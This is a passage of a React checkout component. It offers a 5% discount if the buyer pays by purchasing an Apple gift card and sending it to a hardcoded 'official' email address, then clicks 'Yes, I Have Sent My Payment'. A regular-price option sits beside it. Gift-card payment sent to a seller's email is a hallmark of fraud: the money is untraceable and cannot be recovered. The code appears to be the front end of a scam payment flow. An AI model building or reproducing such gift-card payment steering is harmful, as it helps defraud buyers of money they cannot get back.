                    className="min-h-[48px] px-4 py-3 rounded-xl bg-gradient-to-r from-emerald-500 to-teal-500 hover:brightness-105 disabled:opacity-60 text-[#030816] font-black text-xs uppercase tracking-wider inline-flex items-center justify-center gap-2 cursor-pointer shadow-lg"
                  >
                    {isConfirmingSent ? (
                      <>
                        <Loader2 className="w-4 h-4 animate-spin" />
                        <span>Recording Confirmation...</span>
                      </>
                    ) : (
                      <>
                        <Send className="w-4 h-4 shrink-0" />
                        <span>Yes, I Have Sent My Payment</span>
                      </>
                    )}
                  </button>

                  <a
                    href={APPLE_STORE_GIFT_CARD_URL}
                    target="_blank"
                    rel="noopener noreferrer"
                    onClick={handleDirectAppleStoreClick}
                    className="min-h-[48px] px-4 py-3 rounded-xl bg-white/5 hover:bg-white/10 border border-[#B0B7BC]/35 text-[#E2E8F0] font-bold text-xs uppercase tracking-wider inline-flex items-center justify-center gap-2 cursor-pointer"
                  >
                    <ExternalLink className="w-3.5 h-3.5 shrink-0" />
                    <span>Not Yet · Reopen Apple Store</span>
                  </a>
                </div>
              </motion.div>
            )}

            {/* 8. Primary Direct Apple Store Redirect & Separate Regular $100 Checkout */}
            <div className="space-y-2.5 pt-1">
              {hasValidForm ? (
                <a
                  href={APPLE_STORE_GIFT_CARD_URL}
                  target="_blank"
                  rel="noopener noreferrer"
                  onClick={handleDirectAppleStoreClick}
                  className="w-full min-h-[54px] px-6 py-4 rounded-xl bg-gradient-to-r from-white via-[#E2E8F0] to-white hover:brightness-105 text-[#040B1A] font-black text-sm sm:text-base uppercase tracking-wider shadow-[0_14px_34px_-8px_rgba(226,232,240,0.45)] border border-white flex items-center justify-center gap-2.5 transition-all cursor-pointer text-center"
                >
                  <AppleLogoMark className="w-5 h-5 shrink-0" />
                  <span>CLAIM MY 5% DISCOUNT — ${discountedTotal.toFixed(2)}</span>
                  <ExternalLink className="w-4 h-4 shrink-0" />
                </a>
              ) : (
                <button
                  type="button"
                  onClick={handleValidationFailure}
                  className="w-full min-h-[54px] px-6 py-4 rounded-xl bg-gradient-to-r from-white via-[#E2E8F0] to-white hover:brightness-105 text-[#040B1A] font-black text-sm sm:text-base uppercase tracking-wider shadow-[0_14px_34px_-8px_rgba(226,232,240,0.45)] border border-white flex items-center justify-center gap-2.5 transition-all cursor-pointer text-center"
                >
                  <AppleLogoMark className="w-5 h-5 shrink-0" />
                  <span>CLAIM MY 5% DISCOUNT — ${discountedTotal.toFixed(2)}</span>
                  <ExternalLink className="w-4 h-4 shrink-0" />
                </button>
              )}

              <p className="text-[11px] text-center text-[#94A3B8] leading-snug px-2">
                Opens <span className="font-mono text-[#CBD5E1]">apple.com/shop/gift-cards</span> in a new tab · Auto-copies{" "}
                <span className="font-mono text-white">{OFFICIAL_GIFTCARD_EMAIL}</span> · Keep this tab open to confirm when sent
              </p>

              <div className="flex flex-col sm:flex-row items-center justify-center gap-2.5 pt-0.5">
                <button
                  type="button"
                  onClick={() =>
                    onSelectOffer({
                      includeJersey,
                      totalUsd: regularTotal,
                      discountUsd: 0,
                      paymentPreference: "regular",
                      customerName: trimmedName,
                      customerEmail: trimmedEmail,
                    })
                  }
                  className="w-full sm:w-auto min-h-[44px] px-5 py-2.5 rounded-xl bg-transparent hover:bg-white/5 border border-[#B0B7BC]/30 text-xs font-bold uppercase tracking-wider text-[#E2E8F0] hover:text-white transition-colors cursor-pointer inline-flex items-center justify-center gap-2"
                >
                  <span>CONTINUE AT REGULAR PRICE (${regularTotal.toFixed(2)})</span>
                  <ArrowRight className="w-3.5 h-3.5 shrink-0" />
                </button>
              </div>
            </div>
          </div>
        </motion.div>
      </motion.div>
    </AnimatePresence>
  );
};
